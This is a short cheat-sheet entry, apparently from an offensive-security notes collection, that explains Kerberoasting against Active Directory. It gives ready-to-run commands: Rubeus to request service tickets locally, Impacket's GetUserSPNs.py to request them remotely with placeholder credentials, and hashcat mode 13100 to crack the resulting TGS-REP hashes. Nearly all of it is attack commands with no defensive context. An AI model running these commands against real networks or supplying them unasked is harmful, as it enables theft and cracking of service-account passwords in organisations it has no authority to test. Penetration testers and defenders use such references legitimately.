# Kerberoasting

#### Kerberoasting

> **Kerberoasting** allows a user to request a service ticket for any service with a registered **SPN** then use that ticket to crack the service password.

* **Rubeus** (local):

```powershell
.\Rubeus.exe kerberoast
```

* **Impacket** (remote):

```bash
GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request
```

* Cracking Kerberos 5 etype 23 TGS-REP:

```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```
